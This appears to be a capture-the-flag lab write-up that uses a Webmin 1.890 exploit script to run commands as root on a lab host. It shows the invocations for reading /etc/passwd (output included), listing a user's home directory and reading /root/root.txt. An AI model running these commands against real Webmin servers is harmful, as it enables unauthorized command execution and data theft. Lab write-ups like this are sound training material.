### What tools?
Bcos Ubuntu uses `apt` by default I assumed it's installed
`sudo python3 webmin-1.890_exploit.py 10.10.132.155 10000 'apt list' > ~/Workspace/dir/list`

### User flag
`sudo python3 webmin-1.890_exploit.py 10.10.79.206 10000 'cat /etc/passwd'`
```
<h1>Error - Perl execution failed</h1>
<p>Your password has expired, and a new one must be chosen.
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
dark:x:1000:1000:Dark:/home/dark:/bin/bash
</p>
```

There is user `dark` with `/home/dark` and `/bin/bash`

`sudo python3 webmin-1.890_exploit.py 10.10.79.206 10000 'cd /home/dark; ls -la'`
```
<p>Your password has expired, and a new one must be chosen.
total 15228
drwxr-xr-x 5 dark dark     4096 Jun 26  2020 .
drwxr-xr-x 3 root root     4096 Jun 26  2020 ..
-rw------- 1 dark dark        7 Jun 26  2020 .bash_history
-rw-r--r-- 1 dark dark      220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 dark dark     3771 Apr  4  2018 .bashrc
drwx------ 2 dark dark     4096 Jun 26  2020 .cache
drwx------ 3 dark dark     4096 Jun 26  2020 .gnupg
drwxrwxr-x 3 dark dark     4096 Jun 26  2020 .local
-rw-r--r-- 1 dark dark      807 Apr  4  2018 .profile
-rw-r--r-- 1 dark dark        0 Jun 26  2020 .sudo_as_admin_successful
-rw-rw-r-- 1 dark dark       29 Jun 26  2020 user.txt
-rw-rw-r-- 1 dark dark 15550066 Jun 26  2020 webmin_1.890_all.deb
</p>
```
There is `user.txt` :D

Flag is easly obtainable with `cat`
### Root flag
`sudo python3 webmin-1.890_exploit.py 10.10.79.206 10000 'cat /root/root.txt'`